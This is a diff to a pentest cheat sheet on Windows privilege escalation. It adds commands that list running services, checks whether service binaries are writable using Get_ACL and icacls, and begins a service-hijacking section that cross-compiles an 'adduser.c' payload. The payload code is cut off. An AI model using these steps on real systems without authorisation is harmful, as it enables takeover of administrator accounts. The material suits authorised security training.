@@ -131,16 +131,22 @@ PS> .\Seatbelt.exe -group=all
 
 ## Services
 
+List services (warning, needs an RDP connection for non-admin users. A bind shell or WinRM connection won't do):
 ```
 Get-CimInstance -ClassName win32_service | Select Name, StartMode, State, PathName | Where-Object {$_.State -like 'Running'}
-Get_ACL
-icacls
 ```
+Check the rights to overwrite user installed binaries:
+```
+PS> Get_ACL "c:\path\to\user\installed\binary\service.exe"
+cmd> icacls "c:\path\to\user\installed\binary\service.exe"
+```
+Permission mask: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
 
 ### Hijacking
 
-#### Manual
+#### Manual hijacking: `useradd.c` code
 
+To compile with [cross-compilation](https://github.com/ThomasBucaioni/pentools/blob/main/microsoft/cross-compiling.md): `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
 ```
 #include <stdlib.h>
 
